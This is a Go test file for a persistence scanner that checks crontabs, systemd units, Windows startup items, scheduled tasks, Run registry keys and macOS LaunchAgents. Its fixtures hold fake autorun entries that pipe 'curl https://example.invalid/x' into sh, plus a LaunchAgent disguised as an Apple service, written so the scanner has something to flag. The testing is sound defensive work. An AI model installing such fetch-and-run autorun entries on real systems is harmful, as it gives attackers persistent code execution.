package autorun

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

func TestLinuxFixture(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	loc := DefaultLocations("linux", home, sys, "dev")
	if err := os.MkdirAll(filepath.Dir(loc.SystemCrontabs[0]), 0o755); err != nil {
		t.Fatal(err)
	}
	cron := "@reboot dev curl https://example.invalid/x | sh\n0 5 * * * root /usr/bin/true\n"
	if err := os.WriteFile(loc.SystemCrontabs[0], []byte(cron), 0o644); err != nil {
		t.Fatal(err)
	}
	unitDir := loc.UserSystemd[0]
	if err := os.MkdirAll(unitDir, 0o755); err != nil {
		t.Fatal(err)
	}
	unit := "[Service]\nExecStart=/usr/bin/true\n"
	if err := os.WriteFile(filepath.Join(unitDir, "demo.service"), []byte(unit), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(loc)
	var high, info int
	for _, f := range got.Findings {
		switch f.Severity {
		case "high":
			high++
		case "info":
			info++
		}
	}
	if high != 1 || info < 1 {
		t.Fatalf("high %d info %d %#v", high, info, got.Findings)
	}
}

func TestWindowsShapesOnThisHost(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	loc := DefaultLocations("windows", home, sys, "dev")
	startup := loc.UserStartup[0]
	if err := os.MkdirAll(startup, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(startup, "sysmon.cmd"), []byte("REM fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	taskDir := loc.TaskDirs[0]
	if err := os.MkdirAll(taskDir, 0o755); err != nil {
		t.Fatal(err)
	}
	xml := `<Task><RegistrationInfo><URI>\SysMon</URI></RegistrationInfo><Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo fixture</Arguments></Exec></Actions></Task>`
	if err := os.WriteFile(filepath.Join(taskDir, "SysMon"), []byte(xml), 0o644); err != nil {
		t.Fatal(err)
	}
	ms := filepath.Join(taskDir, "Microsoft", "Windows")
	if err := os.MkdirAll(ms, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ms, "benign"), []byte(xml), 0o644); err != nil {
		t.Fatal(err)
	}
	loc.Registry = fakeReg{
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`: {"OneDrive": `C:\Program Files\OneDrive.exe`},
		`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`: {"Bad": `curl https://example.invalid/x | sh`},
	}
	loc.ReadRegistry = true
	got := Collect(loc)
	var startupN, taskN, regUser, regHigh, msTask int
	for _, f := range got.Findings {
		switch f.RuleID {
		case "autorun.startup":
			startupN++
		case "autorun.task":
			taskN++
			if filepath.Base(f.Path) == "benign" {
				msTask++
			}
		case "autorun.registry":
			if f.Severity == "high" {
				regHigh++
			} else {
				regUser++
			}
		}
	}
	if startupN != 1 || taskN != 1 || msTask != 0 || regUser != 1 || regHigh != 1 {
		t.Fatalf("startup %d task %d ms %d reg %d high %d goos %s findings %#v", startupN, taskN, msTask, regUser, regHigh, runtime.GOOS, got.Findings)
	}
}

func TestDarwinLaunchAgent(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	loc := DefaultLocations("darwin", home, sys, "dev")
	dir := loc.UserLaunch[0]
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	plist := `<?xml version="1.0"?><plist><dict><key>Label</key><string>com.apple.sysmond</string><key>ProgramArguments</key><array><string>/bin/sh</string></array></dict></plist>`
	if err := os.WriteFile(filepath.Join(dir, "com.apple.sysmond.plist"), []byte(plist), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(loc)
	if len(got.Findings) != 1 || got.Findings[0].Severity != "medium" {
		t.Fatalf("%#v", got.Findings)
	}
}

type fakeReg map[string]map[string]string

func (f fakeReg) ReadKey(name string) (map[string]string, error) {
	m, ok := f[name]
	if !ok {
		return nil, os.ErrNotExist
	}
	return m, nil
}

func TestDefaultLocationsExistForEachOS(t *testing.T) {
	for _, goos := range []string{"linux", "darwin", "windows"} {
		loc := DefaultLocations(goos, filepath.Join("home", "dev"), filepath.Join("sys"), "dev")
		if loc.Home == "" || loc.SystemRoot == "" {
			t.Fatal(goos)
		}
		switch goos {
		case "linux":
			if len(loc.SystemCrontabs) == 0 || len(loc.UserSystemd) == 0 {
				t.Fatal("linux paths")
			}
		case "darwin":
			if len(loc.UserLaunch) == 0 || len(loc.SystemLaunch) != 2 {
				t.Fatal("darwin paths")
			}
		case "windows":
			if len(loc.TaskDirs) != 1 || !loc.ReadRegistry || len(loc.UserStartup) != 1 {
				t.Fatal("windows paths")
			}
		}
	}
}
